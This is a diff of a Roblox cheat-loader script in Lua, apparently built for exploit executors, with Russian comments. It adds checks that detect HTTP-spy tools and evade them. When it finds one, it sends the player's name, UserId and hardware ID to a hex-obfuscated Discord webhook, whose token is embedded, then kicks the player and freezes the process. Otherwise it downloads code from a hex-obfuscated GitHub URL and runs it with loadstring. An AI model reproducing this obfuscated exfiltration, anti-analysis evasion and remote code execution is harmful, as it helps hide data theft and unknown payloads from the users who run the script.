@@ -7,22 +7,35 @@ end
 local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 local _L = game:GetService("Players").LocalPlayer
 
-local function isSpy()
+local function _GET_SPY()
     if not _req then return false end
-    if debug and debug.getinfo then
-        local info = debug.getinfo(_req)
-        if info.source then
-            local src = string.lower(info.source)
-            if string.find(src, "spy") or string.find(src, "stealer") or string.find(src, "logger") or src ~= "=[c]" then
-                return true
-            end
-        end
+    
+    -- 1. Проверка на хуки (Подмена C-функции на Lua)
+    local info = debug.getinfo(_req)
+    if info.source ~= "=[C]" or info.what ~= "C" then return "HOOKED_REQUEST" end
+    
+    local hg_info = debug.getinfo(game.HttpGet)
+    if hg_info.source ~= "=[C]" then return "HOOKED_HTTPGET" end
+
+    -- 2. Поиск окон SimpleSpy/HttpSpy в CoreGui
+    local cg = game:GetService("CoreGui")
+    local spyUIs = {"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy"}
+    for _, name in ipairs(spyUIs) do
+        if cg:FindFirstChild(name) then return "SPY_GUI_FOUND_" .. name end
     end
-    if getgenv().SimpleSpy or getgenv().HttpSpy or getgenv().HydroSpy then return true end
+
+    -- 3. Проверка глобальных переменных шпионов через rawget (чтобы не спалиться через __index)
+    for _, name in ipairs(spyUIs) do
+        if rawget(getgenv(), name) then return "SPY_GLOBAL_FOUND_" .. name end
+    end
+
     return false
 end
 
-if isSpy() then
+local _spy_err = _GET_SPY()
+
+if _spy_err then
+    -- ШПИОН НАЙДЕН: Шлем алерт на второстепенный вебхук и СРАЗУ кикаем.
     local _A = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
     pcall(function()
         _req({
@@ -31,26 +44,27 @@ if isSpy() then
             Headers = {["Content-Type"] = "application/json"},
             Body = game:GetService("HttpService"):JSONEncode({
                 embeds = {{
-                    title = "🚨 WEBHOOK STEAL ATTEMPT DETECTED",
+                    title = "🚨 Webhook Theft Attempt Blocked",
                     color = 16711680,
-                    description = "User " .. _L.Name .. " tried to use HTTP Spy to steal the webhook!",
+                    description = "A user tried to spy on the loader. Detection: **" .. tostring(_spy_err) .. "**",
                     fields = {
                         {name = "Player", value = _L.Name .. " (" .. _L.UserId .. ")", inline = true},
-                        {name = "HWID", value = "`" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "`", inline = false}
-                    }
+                        {name = "HWID", value = game:GetService("RbxAnalyticsService"):GetClientId(), inline = false}
+                    },
+                    footer = {text = "Loader v8.1 Protection"}
                 }}
             })
         })
     end)
-    _L:Kick("Security Error: Interceptor Detected")
-    while true do end
+    _L:Kick("Security Error: Interceptor Detected (Type: " .. tostring(_spy_err) .. ")")
+    while true do end -- Замораживаем процесс
     return
 end
 
--- Создаем токен для Core
+-- ВСЁ ЧИСТО: Передаем сигнал и грузим Core
 local _auth = Instance.new("StringValue")
-_auth.Name = "__NK_LOADER_SIGNAL"
-_auth.Value = "V8_SECURE_AUTH_SUCCESS"
+_auth.Name = "__NK_V8_INTERNAL"
+_auth.Value = "V8_SECURE_AUTH_PASSED"
 _auth.Parent = _L
 
 local _G = _D("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F727067672F726566732F68656164732F6D61696E2F727067")
@@ -59,5 +73,5 @@ if ok and res then
     local f = loadstring(res)
     if f then task.spawn(f) end
 else
-    _L:Kick("Connection Error 0x88")
+    _L:Kick("Connection Error 0x82")
 end
